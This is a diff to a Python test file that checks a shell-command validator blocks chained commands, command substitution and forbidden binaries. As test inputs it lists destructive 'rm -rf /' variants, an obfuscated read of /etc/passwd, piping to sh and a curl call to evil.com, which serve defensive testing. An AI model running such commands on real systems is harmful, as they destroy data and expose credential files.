@@ -22,7 +22,11 @@ def test_validate_shell_command_chained_bypasses():
     assert validate_shell_command("ls; rm -rf /")[0] is False
     assert validate_shell_command("echo hi && rm -rf /etc")[0] is False
     assert validate_shell_command("ls | sh")[0] is False
+    
+    # Blocked by command substitution check
     assert validate_shell_command("cat $(rm -rf /)")[0] is False
+    assert validate_shell_command("cat /etc/pass$(echo wd)")[0] is False
+    assert validate_shell_command("echo `ls`")[0] is False
 
 def test_validate_shell_command_forbidden_binaries():
     assert validate_shell_command("curl http://evil.com")[0] is False
